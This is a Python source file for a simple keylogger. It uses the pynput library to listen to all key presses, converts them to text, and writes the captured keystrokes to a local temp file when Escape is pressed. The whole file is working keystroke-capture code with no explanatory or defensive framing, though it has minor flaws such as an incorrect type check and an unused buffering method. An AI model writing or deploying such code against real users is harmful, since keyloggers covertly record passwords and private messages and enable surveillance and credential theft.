import pynput.keyboard
from os import path, remove


def convert_key(key):
    if key is pynput.keyboard.KeyCode:
        return key.char
    else:
        return str(key)


class KeyIntercept:
    def __init__(self, temp_file, buffer_size):
        if path.exists(temp_file):
            remove(temp_file)
        self.list_chars = []
        self.temp_file = temp_file
        self.buffer_size = buffer_size

    def __capture_key__(self, key):
        key_converted = convert_key(key)
        if key_converted == "Key.esc":
            self.__write__file__()
            return False
        elif key_converted == "Key.enter":
            self.list_chars.append("\n")
        elif key_converted == "Key.space":
            self.list_chars.append(" ")
        elif key_converted.startswith("Key."):
            pass
        else:
            clear_char = key_converted.replace("'", "")
            self.list_chars.append(clear_char)

    def init_loop(self):
        with pynput.keyboard.Listener(on_press=self.__capture_key__) as listen:
            listen.join()

    def add_to_list(self, char, force=False):
        if len(self.list_chars) < self.buffer_size:
            self.list_chars.append(char)
        else:
            self.__write__file__()
            self.list_chars.clear()

    def __write__file__(self):
        file = open(self.temp_file, "a+")
        output = "".join(self.list_chars)
        file.write(output)
        file.close()
